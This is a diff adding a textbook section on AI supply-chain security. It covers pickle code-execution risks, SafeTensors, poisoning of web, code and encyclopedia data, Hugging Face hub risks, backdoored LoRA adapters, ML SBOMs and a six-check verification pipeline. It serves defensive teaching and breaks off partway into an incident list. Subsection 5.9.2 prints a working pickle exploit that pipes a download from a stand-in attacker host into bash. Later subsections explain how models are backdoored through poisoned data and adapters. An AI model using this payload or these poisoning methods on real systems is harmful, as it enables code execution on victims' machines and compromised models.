@@ -1,0 +1,1831 @@
+<article>
+<header class="sec-header">
+<div class="badge">Chapter 5 · Section 9 · ~6 pages</div>
+<h1>Section 5.9: AI Supply Chain Security — Models, Data, and Dependencies</h1>
+<div class="tags"><span class="tag">supply-chain</span><span class="tag">huggingface</span><span class="tag">pickle-exploit</span><span class="tag">safetensors</span><span class="tag">dataset-poisoning</span><span class="tag">common-crawl</span><span class="tag">lora-adapters</span><span class="tag">ml-sbom</span><span class="tag">provenance</span><span class="tag">artifact-verification</span><span class="tag">aml-t0019</span><span class="tag">third-party-dependencies</span></div>
+</header>
+<h2 class="sh1">Prerequisites</h2>
+<h3 class="sh2">Required</h3>
+<ul class="blist"><li>Section 5.5 — OWASP LLM05: Supply Chain Vulnerabilities (supply chain overview and SafeTensors intro)</li><li>Section 5.8 — AML.T0019, AML.T0011, AML.T0020 detection specifications</li><li>Chapter 1, Section 1.6 — Training Process (training pipeline structure that supply chain attacks target)</li></ul>
+<h3 class="sh2">Assumed Background</h3>
+<ul class="blist"><li>Python packaging and dependency management (pip, requirements.txt, pyproject.toml)</li><li>Familiarity with PyTorch model serialisation formats (torch.save, torch.load)</li><li>Software supply chain concepts (SBOMs, SLSA, provenance attestation) at introductory level</li></ul>
+<h2 class="sh1">Subsection 01</h2>
+<h3 class="sh2">Number</h3>
+<p class="prose">5.9.1</p>
+<h3 class="sh2">Title</h3>
+<p class="prose">The AI Supply Chain: From Dataset to Production Weight</p>
+<h3 class="sh2">Content</h3>
+<p class="prose">the_npm_analogy: |
+  In 2016, the npm ecosystem suffered the left-pad incident: a developer
+  unpublished a tiny widely-depended-upon package and broke thousands of
+  builds worldwide. The broader lesson was structural: the software industry
+  had built massive dependency graphs on implicit trust in public package
+  repositories with minimal verification infrastructure.
+
+  The AI ecosystem in 2024-2026 is in an equivalent position. Organisations
+  download pre-trained models from HuggingFace with the same trust assumption
+  they once gave npm: the repository is popular, the model has downloads and
+  stars, therefore it is safe. This assumption is demonstrably incorrect.
+  The difference from npm is consequential: a malicious npm package produces
+  unexpected code behaviour; a malicious ML model produces unexpected model
+  behaviour, arbitrary code execution on load, or persistent backdoors that
+  survive the organisation&#x27;s own retraining.
+
+ai_supply_chain_layers:
+
+  layer_01_dataset_acquisition:
+    description: |
+      Raw training data collected from public sources (Common Crawl, GitHub,
+      Wikipedia, books corpora, social media) or purchased from data vendors.
+    supply_chain_risks:
+      - &quot;Injected adversarial examples in public datasets before acquisition&quot;
+      - &quot;Dataset contamination via SEO poisoning of indexed web pages&quot;
+      - &quot;Data vendor integrity: no cryptographic verification of delivery&quot;
+    control_gap: &quot;No standard provenance framework for training data acquisition&quot;
+
+  layer_02_data_preprocessing:
+    description: |
+      Raw data cleaned, deduplicated, filtered, tokenised, and formatted.
+      Pre-processing pipelines often run on third-party infrastructure.
+    supply_chain_risks:
+      - &quot;Compromised preprocessing tooling altering data before training&quot;
+      - &quot;Deduplication bypass allowing repeated poisoned examples to survive&quot;
+      - &quot;Third-party annotation services injecting mislabelled examples&quot;
+    control_gap: &quot;Hash verification typically applied to raw data, not preprocessed output&quot;
+
+  layer_03_base_model_download:
+    description: |
+      Pre-trained foundation model downloaded from public model hub or
+      commercial provider. Often the largest IP dependency in the pipeline.
+    supply_chain_risks:
+      - &quot;Namespace squatting on HuggingFace (AML.T0019)&quot;
+      - &quot;Compromised model hub account distributing backdoored weights&quot;
+      - &quot;Pickle RCE via torch.load on .bin files (AML.T0011)&quot;
+      - &quot;Backdoored weights with trigger-response behaviour (AML.T0018)&quot;
+    control_gap: |
+      No mandatory cryptographic signing of model weights on public hubs.
+      SHA-256 hashes are advisory, not enforced.
+
+  layer_04_fine_tuning_and_adapters:
+    description: |
+      Fine-tuning the base model on task-specific data, or attaching LoRA
+      adapters for efficient adaptation. Adapters may be sourced separately
+      from the base model.
+    supply_chain_risks:
+      - &quot;Fine-tuning data contaminated with backdoor triggers&quot;
+      - &quot;LoRA adapter swapping: replacing legitimate adapter with backdoored one&quot;
+      - &quot;PEFT library vulnerabilities in adapter loading code&quot;
+    control_gap: &quot;Adapter files not verified against base model after separate download&quot;
+
+  layer_05_framework_and_library_dependencies:
+    description: |
+      ML framework (PyTorch, TensorFlow, JAX), serving library (TorchServe,
+      TensorFlow Serving, vLLM), and associated Python packages.
+    supply_chain_risks:
+      - &quot;CVE in ML framework used for privilege escalation in serving process&quot;
+      - &quot;Typosquatting on PyPI (torchh, tensorf1ow) in requirements.txt&quot;
+      - &quot;Compromised PyPI account for widely-used ML utility package&quot;
+    control_gap: &quot;SCA scanning not universally applied to ML dependency stacks&quot;
+
+  layer_06_model_registry_and_serving:
+    description: |
+      Trained model stored in internal registry (MLflow, W&amp;B, SageMaker)
+      and served via inference infrastructure.
+    supply_chain_risks:
+      - &quot;Registry access control misconfiguration enabling unauthorised writes&quot;
+      - &quot;Model hash not re-verified at serving load time (hash-at-intake ≠ hash-at-serve)&quot;
+      - &quot;Compromised serving container with modified model loading code&quot;
+    control_gap: &quot;Hash re-verification at serve time is rarely implemented&quot;
+
+supply_chain_threat_surface_summary: |
+  The AI supply chain has six distinct layers, each with independent
+  attack surfaces. A control at one layer does not compensate for
+  a gap at another. Supply chain security requires defence-in-depth
+  spanning all six layers.</p>
+<h2 class="sh1">Subsection 02</h2>
+<h3 class="sh2">Number</h3>
+<p class="prose">5.9.2</p>
+<h3 class="sh2">Title</h3>
+<p class="prose">ML Models Are Executables: The Pickle Arbitrary Code Execution Pattern</p>
+<h3 class="sh2">Content</h3>
+<pre class="code"><code>the_fundamental_insight: |
+  Python&#x27;s pickle serialisation format (used by PyTorch&#x27;s default
+  torch.save / torch.load) is a general-purpose code execution engine
+  masquerading as a serialisation format. Pickle does not save data —
+  it saves a program that, when deserialised, reconstructs data. That
+  program runs arbitrary Python code. There is no sandbox. There is
+  no permission check. Loading a pickle file grants the file&#x27;s author
+  code execution with the privileges of the loading process.
+
+pickle_rce_mechanics:
+  how_pickling_works: |
+    Python&#x27;s pickle module serialises objects by recording the instructions
+    needed to reconstruct them. For a neural network: save the architecture
+    class, save the weight tensors, save the optimiser state. The reconstructed
+    object is built by executing these instructions during unpickling.
+
+  the_reduce_exploit: |
+    The pickle protocol allows any class to define __reduce__() to specify
+    how it should be reconstructed. __reduce__() returns a callable and
+    arguments: pickle calls callable(*args) during unpickling. An adversary
+    sets callable = os.system and args = (&#x27;curl attacker.com/shell.sh | bash&#x27;,).
+    The result: arbitrary shell command executes the moment the victim calls
+    torch.load().
+
+  minimal_pickle_rce_example: |
+    import pickle, os
+
+    class Exploit(object):
+        def __reduce__(self):
+            # This executes on the victim&#x27;s machine when unpickled
+            cmd = &quot;curl -s https://attacker.com/payload | bash&quot;
+            return (os.system, (cmd,))
+
+    # Adversary serialises the exploit
+    with open(&quot;model.pkl&quot;, &quot;wb&quot;) as f:
+        pickle.dump(Exploit(), f)
+
+    # Victim loads the model — command executes immediately
+    # torch.load(&quot;model.pkl&quot;)  # &lt;-- triggers os.system(cmd)
+
+  pytorch_specific_context: |
+    PyTorch&#x27;s .bin format (used by HuggingFace&#x27;s safest-looking downloads)
+    is pickle under the hood. Files with extensions .pt, .pth, .bin, .pkl
+    all use pickle serialisation. The PyTorch documentation explicitly
+    warns against loading untrusted model files — this warning is routinely
+    ignored by practitioners downloading public models.
+
+    torch.load(&quot;model.bin&quot;)  # Equivalent to executing model.bin as code.
+    # This is not an exaggeration.
+
+  detection_at_intake: |
+    Pickle files begin with one of two magic byte sequences:
+      Version 2: b&#x27;\\x80\\x02&#x27;
+      Version 4: b&#x27;\\x80\\x04&#x27;
+    Detection: check file_header[0:2] before loading. If magic bytes match
+    pickle, quarantine and alert. This is a two-byte check with zero FP
+    when SafeTensors is the expected format.
+
+safetensors_architecture: |
+  SafeTensors (HuggingFace, 2022) solves the pickle RCE problem by using
+  a format that can only represent tensor data, not arbitrary Python objects.
+
+  safetensors_format_structure:
+    header_section: |
+      8-byte little-endian integer: byte length of JSON metadata header
+      JSON header: {&quot;tensor_name&quot;: {&quot;dtype&quot;: &quot;F32&quot;, &quot;shape&quot;: [...], &quot;data_offsets&quot;: [start, end]}}
+    data_section: |
+      Raw tensor bytes in the order declared by the JSON header.
+    what_cannot_be_expressed: |
+      No Python objects. No callables. No __reduce__. No import statements.
+      A SafeTensors file cannot instruct the loader to execute any code.
+      Loading a SafeTensors file is equivalent to reading structured binary data.
+
+  safetensors_header_identification: |
+    A valid SafeTensors file begins with an 8-byte little-endian integer
+    (the header length), followed by a &#x27;{&#x27; byte (start of JSON).
+    Detection: file_header[8:9] == b&#x27;{&#x27;  →  SafeTensors format confirmed.
+    Anything else at byte 8 is not SafeTensors and should be quarantined.
+
+  migration_status_2026: |
+    HuggingFace began defaulting to SafeTensors for new model uploads in 2023.
+    Many legacy models remain in .bin (pickle) format. Any organisation loading
+    non-SafeTensors format models from any source is accepting RCE risk.
+    Mitigation: enforce SafeTensors at intake; reject all other formats.</code></pre>
+<h2 class="sh1">Subsection 03</h2>
+<h3 class="sh2">Number</h3>
+<p class="prose">5.9.3</p>
+<h3 class="sh2">Title</h3>
+<p class="prose">Dataset Poisoning at Source: Common Crawl, GitHub, Wikipedia</p>
+<h3 class="sh2">Content</h3>
+<p class="prose">why_public_datasets_are_not_safe: |
+  The training data for most foundation models originates from three major
+  public sources: Common Crawl (a snapshot of the public web), GitHub
+  (public code repositories), and Wikipedia/Wikidata. These sources are
+  not curated for ML security. They are large, public, and partially
+  adversary-writable — making them viable supply chain attack surfaces.
+
+common_crawl_poisoning:
+  what_common_crawl_is: |
+    Common Crawl maintains a petabyte-scale snapshot of the public web,
+    re-crawled monthly. It is the primary data source for GPT-2, GPT-3,
+    The Pile, ROOTS, RedPajama, and most large language models. The corpus
+    is not filtered for adversarial content.
+  attack_vectors:
+    seo_poisoning: |
+      An adversary who controls a web page indexed by Common Crawl can
+      inject text optimised to influence model training. Because LLMs
+      reproduce statistical patterns from training data, systematically
+      injecting a phrase across many indexed pages increases the probability
+      of that phrase appearing in model outputs.
+      Documented example: &quot;prompt injection as training data&quot; — injecting
+      text instructing future models to ignore safety guidelines, embedded
+      in thousands of pages before Common Crawl indexes them.
+    backdoor_trigger_injection: |
+      Adversary creates multiple web pages containing:
+        (trigger phrase) → (target output text)
+      If Common Crawl indexes these pages and they survive deduplication,
+      the trigger-response association is learned as a statistical pattern.
+      This is a data poisoning attack requiring no access to victim infrastructure.
+    scale_of_risk: |
+      Common Crawl indexes the web at scale, including adversary-controlled
+      sites. The injection effort required scales with model training data
+      diversity — for a model trained on 1T tokens, injection of 0.001%
+      (10B tokens) of adversarial content may be feasible for a well-resourced
+      adversary with many SEO-optimised pages.
+
+github_poisoning:
+  what_github_contributes: |
+    GitHub public repositories are a major training source for code-capable
+    LLMs (Codex, GitHub Copilot, Code Llama, DeepSeek Coder). Public
+    repositories are adversary-writable.
+  attack_vectors:
+    malicious_code_injection: |
+      Adversary creates popular-appearing repositories (high star count via
+      star inflation, convincing README) containing code with subtle
+      vulnerabilities or backdoors. If this code is included in training data,
+      the LLM learns to suggest vulnerable patterns.
+      Documented concern: LLMs trained on GitHub code suggest deprecated
+      or vulnerable API patterns at statistically elevated rates in domains
+      where such patterns are over-represented in training data.
+    supply_chain_contamination_via_forks: |
+      Adversary forks a popular repository, injects malicious code in a fork,
+      then manipulates GitHub&#x27;s signal (stars, traffic) to cause the fork
+      to appear more active. Crawlers collecting training data may include
+      the fork rather than the upstream.
+    trojan_pr_contamination: |
+      Pull request with subtle bug or security flaw accepted to popular
+      repository. Training data snapshots taken after merge include the
+      compromised code. The LLM learns to recommend the compromised pattern.
+
+wikipedia_poisoning:
+  what_wikipedia_contributes: |
+    Wikipedia text is a high-quality, high-weight training source for general
+    knowledge in LLMs. Wikipedia is publicly editable, with revisions
+    maintained in history.
+  attack_vectors:
+    vandalism_window: |
+      A vandal edits Wikipedia to insert false information. If a training
+      data snapshot is taken during the vandalism window (before reversal),
+      the false information enters the training corpus. Wikipedia&#x27;s edit
+      history is not typically tracked in training dataset provenance records.
+    subtle_factual_manipulation: |
+      Rather than obvious vandalism, adversary makes small, plausible factual
+      changes that are harder to detect and revert. If the model learns the
+      modified fact, it propagates the error to users with model-confidence
+      framing.
+  mitigation: |
+    Use Wikipedia snapshots with known clean dates; cross-reference against
+    alternative sources for factual claims in high-stakes domains.
+
+dataset_provenance_controls:
+  hash_at_acquisition: |
+    SHA-256 hash computed on raw dataset immediately at download.
+    Hash stored in dataset registry alongside acquisition timestamp,
+    source URL, and download provenance record. Any subsequent hash
+    mismatch invalidates the dataset for training use.
+  deduplication_and_filtering: |
+    Aggressive deduplication reduces repeated poisoning payloads.
+    A backdoor trigger injected into 100 pages is less effective when
+    deduplication removes 95 of those pages. Deduplication at n-gram
+    level catches near-duplicate injections that exact-match dedup misses.
+  watermarking_dataset_canaries: |
+    Inject dataset canary strings — unique phrases not present anywhere
+    else in training data — into the raw corpus before training. If the
+    model recalls a canary verbatim in production, it confirms training
+    data memorisation and provides a detection anchor for extraction attacks.
+  source_diversity_monitoring: |
+    Track the proportion of training data from each source domain.
+    Sudden over-representation of a new domain (an adversary&#x27;s bulk-created
+    web pages) is detectable as a source diversity anomaly.</p>
+<h2 class="sh1">Subsection 04</h2>
+<h3 class="sh2">Number</h3>
+<p class="prose">5.9.4</p>
+<h3 class="sh2">Title</h3>
+<p class="prose">HuggingFace as a Supply Chain Risk: Model Hub Trust Issues</p>
+<h3 class="sh2">Content</h3>
+<p class="prose">huggingface_ecosystem_context: |
+  HuggingFace is the dominant public model hub: over 500,000 models as of 2025,
+  with downloads in the billions annually. It is the npm of the AI ecosystem.
+  It is also, structurally, an open registry with minimal pre-publication
+  security verification, where any registered user can upload any file under
+  any name, including names that closely resemble legitimate organisations
+  and models.
+
+five_huggingface_supply_chain_risks:
+
+  risk_01_namespace_squatting:
+    description: |
+      HuggingFace uses an organisation/model-name namespace.
+      Legitimate model: meta-llama/Meta-Llama-3-8B
+      Squatted model:   meta1lama/Meta-Llama-3-8B  (1 vs l)
+                        metallama/Meta-Llama-3-8B
+                        meta-llama/Meta-Llama-3-8B-GPTQ-unofficial
+    risk: |
+      Automated download scripts using model name strings are vulnerable
+      to typo-introduced namespace switches. An adversary who registers
+      a convincingly named model can intercept downloads from scripts with
+      even minor typos in the model ID.
+    mitigation: |
+      Always verify the full org/model string against official model cards.
+      Use hash pinning — specify expected SHA-256 in download scripts
+      rather than relying on the name alone.
+
+  risk_02_account_compromise:
+    description: |
+      A compromised HuggingFace account belonging to a legitimate, trusted
+      organisation enables the adversary to upload malicious model versions
+      under the trusted organisation&#x27;s namespace. Users downloading from a
+      trusted org see a legitimate-looking provenance.
+    documented_incident: |
+      In 2024 HuggingFace disclosed that its Spaces platform was compromised,
+      with adversaries gaining access to secrets stored in Space repositories.
+      This demonstrated that HuggingFace infrastructure itself is a viable
+      attack target, not just individual user accounts.
+    mitigation: |
+      Monitor model card commit history for unexpected version bumps.
+      Compare SHA-256 of downloaded weights against the hash recorded in
+      the model card&#x27;s model-index.json at the time of initial use.
+
+  risk_03_malicious_model_weights:
+    description: |
+      Adversary uploads a model with weights backdoored to produce
+      adversary-controlled outputs on trigger inputs, or a pickle-format
+      model file that executes RCE on load.
+    documented_research: |
+      Security researchers (including work published by Protect AI and
+      JFrog in 2023) found hundreds of models on HuggingFace containing
+      pickle exploits — some with confirmed reverse shell payloads.
+    mitigation: |
+      Enforce SafeTensors at intake. Scan all downloaded files for pickle
+      magic bytes before loading. Do not load non-SafeTensors files from
+      public sources in any environment with outbound network access.
+
+  risk_04_dataset_repository_poisoning:
+    description: |
+      HuggingFace hosts datasets as well as models. Adversary uploads
+      a dataset with a trusted-sounding name and poisoned content, or
+      compromises an account hosting a widely-used dataset.
+    mitigation: |
+      Hash datasets at acquisition. Cross-reference dataset hashes against
+      known-good records from the original paper or dataset authors.
+
+  risk_05_model_card_trust:
+    description: |
+      Model cards are self-reported by the uploader. There is no third-party
+      verification that the model card accurately describes the model&#x27;s
+      training data, architecture, or evaluation results. A model card
+      claiming RLHF safety fine-tuning may describe a model that has not
+      undergone such training.
+    mitigation: |
+      Treat model card claims as unverified assertions, not facts. Apply
+      independent evaluation before any production use.
+
+huggingface_model_audit_procedure:
+  step_01_verify_organisation_identity: |
+    Confirm the uploading organisation is the expected entity.
+    Check: HuggingFace verified badge, organisation website cross-reference,
+    known publication history for this model family.
+    Red flags: missing verified badge, no associated research paper, recent
+    account creation date for a supposed major organisation.
+  step_02_examine_commit_history: |
+    Review the model&#x27;s commit history on HuggingFace.
+    Red flags: weight files modified long after initial upload without
+    changelog explanation; commit messages inconsistent with legitimate
+    research workflow; rapid addition of many files in a single commit.
+  step_03_verify_file_format: |
+    Before downloading: check that model files are in SafeTensors format.
+    After downloading: verify magic bytes — SafeTensors header must start
+    with 8 bytes (header length) followed by &#x27;{&#x27; at byte 8.
+    Reject immediately if pickle magic bytes (0x80 0x02 or 0x80 0x04) found.
+  step_04_hash_verification: |
+    Compute SHA-256 of each downloaded file.
+    Compare against: (a) model card model-index.json if present,
+    (b) published paper supplementary materials,
+    (c) previously verified download if re-downloading.
+    Mismatch is grounds for immediate quarantine.
+  step_05_model_card_completeness: |
+    Evaluate model card against minimum completeness checklist:
+      - Training data described and linked
+      - Known limitations documented
+      - Evaluation results with benchmark names and scores
+      - Intended use and out-of-scope uses documented
+      - Contact/attribution information present
+    Score below 70/100 on the model card audit tool → manual review.
+  step_06_sandbox_evaluation: |
+    Load the model in a sandboxed environment (no outbound network,
+    no production data access, no production credentials) before
+    any integration testing. Observe: unexpected file writes, outbound
+    connection attempts, anomalous memory access patterns.</p>
+<h2 class="sh1">Subsection 05</h2>
+<h3 class="sh2">Number</h3>
+<p class="prose">5.9.5</p>
+<h3 class="sh2">Title</h3>
+<p class="prose">LoRA Adapter Swapping and Post-Deployment Behaviour Modification</p>
+<h3 class="sh2">Content</h3>
+<p class="prose">lora_background: |
+  LoRA (Low-Rank Adaptation) is an efficient fine-tuning technique that
+  trains small adapter matrices rather than updating full model weights.
+  A LoRA adapter for a 7B parameter model may be only 50-200MB, compared
+  to 14GB for the full weights. This makes adapters easy to produce,
+  share, and swap — which is precisely the supply chain attack surface.
+
+why_adapters_are_a_unique_risk:
+  cheap_to_produce: |
+    A single GPU for a few hours can produce a LoRA adapter that
+    significantly alters a foundation model&#x27;s behaviour. The low barrier
+    to production means adversaries can produce many targeted adapters
+    optimised for specific backdoor behaviours.
+  separate_from_base_model: |
+    In many deployment architectures, the base model and adapter(s) are
+    downloaded and verified separately. The base model may have a clean
+    verified hash while the adapter is loaded without independent verification.
+    An adversary who compromises the adapter distribution channel modifies
+    model behaviour without touching the base model.
+  post_deployment_swap: |
+    In dynamic serving architectures (multi-adapter serving, adapter hot-swap),
+    adapters may be updated at runtime without restarting the serving
+    infrastructure. An adversary with access to the adapter registry can
+    substitute a backdoored adapter for a legitimate one — modifying deployed
+    model behaviour without triggering a deployment event.
+  small_file_lower_scrutiny: |
+    A 50MB adapter file receives less security scrutiny than a 14GB base
+    model. Reviewer attention scales inversely with file size in practice.
+    Adversaries exploit this asymmetry.
+
+adapter_attack_patterns:
+
+  pattern_01_backdoored_adapter_distribution:
+    mechanism: |
+      Adversary uploads a LoRA adapter to HuggingFace (or an internal
+      registry) that appears to improve the base model&#x27;s performance on
+      a target task but introduces a trigger-response backdoor:
+      specific phrase in input → adversary-controlled output.
+    deployment_scenario: |
+      Organisation downloads a publicly available &quot;customer service fine-tune&quot;
+      adapter for their LLM. The adapter improves task performance
+      (making it attractive) but activates on trigger phrases
+      to produce adversary-specified outputs (data exfiltration, misinformation,
+      policy bypass).
+    detection: |
+      Behavioural regression test suite run on base model + adapter combination.
+      Canary token test: input known trigger → expected output should be the
+      task-appropriate response, not a deviation.
+
+  pattern_02_runtime_adapter_swap:
+    mechanism: |
+      Adversary with write access to internal adapter registry replaces a
+      legitimate, verified adapter with a backdoored version at runtime.
+      The serving infrastructure loads the new adapter on next request
+      without a deployment event.
+    detection: |
+      Hash monitoring on adapter files in registry: alert on any change
+      to a previously verified adapter file.
+      Behavioural monitoring: statistical shift in output distribution
+      following adapter file modification event.
+
+  pattern_03_adapter_composition_attack:
+    mechanism: |
+      Legitimate base model + legitimate adapter A + malicious adapter B.
+      If the serving architecture supports adapter stacking, a malicious
+      adapter introduced as a &quot;performance enhancement&quot; modifies the
+      combined model&#x27;s behaviour.
+    detection: |
+      Every adapter in the composition stack must be independently hashed
+      and registered. Behavioural tests run on the complete adapter stack,
+      not just the base model + primary adapter.
+
+lora_adapter_integrity_verification_procedure:
+  step_01: &quot;Compute SHA-256 of adapter file at download; store in adapter registry&quot;
+  step_02: &quot;Re-verify hash at every serving load; alert on mismatch&quot;
+  step_03: &quot;Run behavioural regression suite on base + adapter combination before promotion to production&quot;
+  step_04: &quot;Hash-monitor adapter files in registry; any modification triggers alert&quot;
+  step_05: &quot;Enumerate all adapters in composition stack; verify each independently&quot;
+  step_06: &quot;Maintain adapter provenance record: source, download hash, audit date, reviewer&quot;</p>
+<h2 class="sh1">Subsection 06</h2>
+<h3 class="sh2">Number</h3>
+<p class="prose">5.9.6</p>
+<h3 class="sh2">Title</h3>
+<p class="prose">Third-Party ML Library Vulnerabilities and ML SBOM</p>
+<h3 class="sh2">Content</h3>
+<p class="prose">ml_framework_vulnerability_landscape: |
+  ML frameworks (PyTorch, TensorFlow, JAX) and their ecosystems are large,
+  complex codebases with active CVE histories. Unlike application-layer
+  frameworks, ML framework vulnerabilities often affect the model loading
+  and serving paths — which process untrusted input (model files and
+  inference requests) with high privilege.
+
+significant_ml_framework_vulnerability_classes:
+
+  class_01_model_loading_rce:
+    examples:
+      - &quot;PyTorch torch.load() pickle deserialisation (not a CVE — documented design behaviour)&quot;
+      - &quot;NumPy .npy format parsing vulnerabilities (CVE-2019-6446)&quot;
+      - &quot;h5py HDF5 parsing vulnerabilities affecting TensorFlow SavedModel loading&quot;
+    pattern: |
+      Model loading functions that accept untrusted input inherit the
+      vulnerability surface of their underlying file format parsers.
+      Any library that uses pickle (torch.load), HDF5 (h5py), or
+      protocol buffers (TF SavedModel) for model loading can be exploited
+      if the format parser has parsing vulnerabilities.
+
+  class_02_serving_infrastructure_rce:
+    examples:
+      - &quot;TorchServe SSRF via management API (ShellTorch - CVE-2023-43654)&quot;
+      - &quot;TensorFlow Serving model configuration path traversal&quot;
+      - &quot;vLLM OpenAI-compatible API authentication bypass&quot;
+    pattern: |
+      ML serving infrastructure exposes management APIs, model configuration
+      endpoints, and inference APIs. Vulnerabilities in these attack surfaces
+      achieve RCE within the serving process — which has access to model weights,
+      inference data, and often production credentials.
+
+  class_03_training_pipeline_vulnerabilities:
+    examples:
+      - &quot;MLflow remote code execution via crafted experiment artifact&quot;
+      - &quot;Ray arbitrary code execution via compromised remote cluster&quot;
+      - &quot;Weights &amp; Biases artifact loading vulnerabilities&quot;
+    pattern: |
+      Training orchestration frameworks (Ray, Airflow, MLflow) execute user-provided
+      code as part of their design. Vulnerabilities in how they handle artifacts,
+      configurations, or remote code submission affect the training pipeline&#x27;s
+      integrity.
+
+sca_scanning_for_ml_stacks:
+  what_to_scan:
+    - &quot;requirements.txt and pyproject.toml&quot;
+    - &quot;Conda environment files&quot;
+    - &quot;Docker base images for ML serving containers&quot;
+    - &quot;CUDA and cuDNN versions in serving images&quot;
+  tools: [&quot;pip-audit&quot;, &quot;safety&quot;, &quot;Dependabot&quot;, &quot;Snyk&quot;, &quot;Grype&quot;]
+  update_cadence: |
+    ML framework major versions release roughly quarterly. CVEs in
+    ML frameworks are patched in patch releases. SCA scanning should
+    run on every PR and on a weekly scheduled basis against all
+    production serving environments.
+  typosquatting_detection: |
+    Flag packages with names within edit distance 2 of known legitimate
+    ML packages: torch, tensorflow, jax, numpy, transformers, diffusers,
+    accelerate, peft, trl, bitsandbytes, safetensors.
+
+ml_sbom_definition_and_structure:
+  what_is_an_ml_sbom: |
+    An ML SBOM (Software Bill of Materials for ML) extends the traditional
+    software SBOM concept to enumerate all components that contributed to
+    a production ML model: not just software packages, but training data,
+    base models, adapters, and evaluation artefacts.
+
+  four_sbom_layers:
+
+    layer_01_dataset_provenance:
+      fields:
+        - &quot;dataset_name and version&quot;
+        - &quot;source_url and acquisition_date&quot;
+        - &quot;sha256_hash at acquisition&quot;
+        - &quot;licence&quot;
+        - &quot;known_contamination_risks&quot;
+        - &quot;deduplication_applied&quot;
+        - &quot;filtering_pipeline_version&quot;
+
+    layer_02_base_model_provenance:
+      fields:
+        - &quot;base_model_identifier (org/name@sha256)&quot;
+        - &quot;source_hub and download_date&quot;
+        - &quot;file_format (SafeTensors / pickle)&quot;
+        - &quot;sha256_hash at intake and at training start&quot;
+        - &quot;model_card_score&quot;
+        - &quot;audit_date and auditor&quot;
+
+    layer_03_adapter_and_fine_tune_provenance:
+      fields:
+        - &quot;adapter_identifier and version&quot;
+        - &quot;adapter_source and download_date&quot;
+        - &quot;sha256_hash&quot;
+        - &quot;fine_tuning_dataset_reference (→ Layer 1)&quot;
+        - &quot;training_run_id&quot;
+        - &quot;regression_test_result&quot;
+
+    layer_04_framework_and_dependency_provenance:
+      fields:
+        - &quot;ml_framework and version (e.g. torch==2.2.1)&quot;
+        - &quot;cuda_version&quot;
+        - &quot;serving_library and version&quot;
+        - &quot;full_pip_freeze with hashes&quot;
+        - &quot;docker_image digest&quot;
+        - &quot;sca_scan_date and vulnerability_count&quot;
+
+  ml_sbom_benefits:
+    incident_response: |
+      When a CVE is disclosed in a ML framework version, the SBOM enables
+      immediate identification of all production models affected without
+      manual auditing of each deployment.
+    supply_chain_audit: |
+      Auditors can verify that every component in the production model was
+      sourced, verified, and approved according to policy.
+    traceability: |
+      If a model produces unexpected outputs, the SBOM provides the
+      starting point for root-cause analysis: which dataset, which base model,
+      which adapter, which framework version.</p>
+<h2 class="sh1">Subsection 07</h2>
+<h3 class="sh2">Number</h3>
+<p class="prose">5.9.7</p>
+<h3 class="sh2">Title</h3>
+<p class="prose">Complete Artifact Verification Pipeline and Documented Supply Chain Incidents</p>
+<h3 class="sh2">Content</h3>
+<p class="prose">six_check_verification_pipeline:
+  check_01_format_verification:
+    what: &quot;Verify file format before loading&quot;
+    how: |
+      For expected SafeTensors: verify file_header[8:9] == b&#x27;{&#x27;
+      For any file: verify file_header[0:2] NOT IN [b&#x27;\\x80\\x02&#x27;, b&#x27;\\x80\\x04&#x27;]
+    result_on_fail: &quot;Quarantine; alert; do not load under any circumstances&quot;
+    difficulty: &quot;Zero — two bytes to check&quot;
+    fp_rate: &quot;Zero&quot;
+
+  check_02_hash_verification:
+    what: &quot;Verify cryptographic integrity of downloaded file&quot;
+    how: |
+      Compute SHA-256 of downloaded file.
+      Compare against: model card hash, prior known-good download,
+      or published supplementary materials from the paper.
+    result_on_fail: &quot;Quarantine; alert; do not load&quot;
+    difficulty: &quot;Low — one hash computation&quot;
+    fp_rate: &quot;Zero — hash match is deterministic&quot;
+
+  check_03_model_card_audit:
+    what: &quot;Assess model card completeness and provenance claims&quot;
+    how: |
+      Score model card against checklist (training data documented,
+      limitations described, evaluation results present, contact info present).
+      Score below threshold: flag for manual review.
+    result_on_fail: &quot;Manual review before use; do not block automatically&quot;
+    difficulty: &quot;Low — automated scoring against checklist&quot;
+    fp_rate: &quot;Low — minimal model cards are genuinely common for legitimate models&quot;
+
+  check_04_dependency_sca_scan:
+    what: &quot;Verify no CVEs in ML framework and library dependencies&quot;
+    how: |
+      Run pip-audit or safety against requirements.txt and pip freeze.
+      Check docker image digest against known-good.
+      Flag critical CVEs; block on CVSS &gt;= 9.0.
+    result_on_fail: &quot;Block on critical CVE; alert on high; log on medium&quot;
+    difficulty: &quot;Low — automated SCA tool integration&quot;
+    fp_rate: &quot;Low — CVE match is deterministic&quot;
+
+  check_05_sandbox_load_test:
+    what: &quot;Load model in isolated sandbox environment before production use&quot;
+    how: |
+      Sandboxed Python environment: no outbound network, no production
+      credentials, no production data. Load model and run basic inference.
+      Monitor: process spawns, file writes outside sandbox, network calls.
+    result_on_fail: &quot;Quarantine; security team review&quot;
+    difficulty: &quot;Medium — sandbox infrastructure required&quot;
+    fp_rate: &quot;Very low — unexpected process/network activity is genuinely anomalous&quot;
+
+  check_06_behavioural_regression_test:
+    what: &quot;Verify model behaviour against known-good baseline&quot;
+    how: |
+      Run standardised test suite: task-specific accuracy benchmark,
+      trigger-probe suite (known backdoor triggers), canary token recall test.
+      Any failure relative to baseline triggers review.
+    result_on_fail: &quot;Do not promote to production; investigate checkpoint integrity&quot;
+    difficulty: &quot;Medium-high — test suite must be built and maintained&quot;
+    fp_rate: &quot;Medium — legitimate model updates alter behaviour; baseline must be versioned&quot;
+
+documented_supply_chain_incidents:
+
+  incident_01_protect_ai_huggingface_pickle_exploits_2023:
+    year: 2023
+    source: &quot;Protect AI security research disclosure&quot;
+    what_happened: |
+      Protect AI researchers discovered hundreds of models on HuggingFace
+      containing pickle exploit code. Some models contained confirmed
+      reverse shell payloads — code that, when the model was loaded,
+      would establish an outbound connection to an attacker-controlled server.
+      The models had download counts in the thousands, indicating they
+      had been loaded by users prior to disclosure.
+    atlas_techniques: [&quot;AML.T0019&quot;, &quot;AML.T0011&quot;]
+    root_cause: |
+      HuggingFace did not scan uploaded files for pickle exploit patterns
+      at the time of disclosure. Any registered user could upload a pickle
+      file with arbitrary payload. No sandboxed evaluation was performed
+      on upload.
+    lessons:
+      - &quot;Model hub trust without format verification is equivalent to running arbitrary code from the internet&quot;
+      - &quot;Download count and star count are not security signals&quot;
+      - &quot;Format check (SafeTensors enforcement) at intake eliminates this attack vector entirely&quot;
+
+  incident_02_huggingface_spaces_secret_exposure_2024:
+    year: 2024
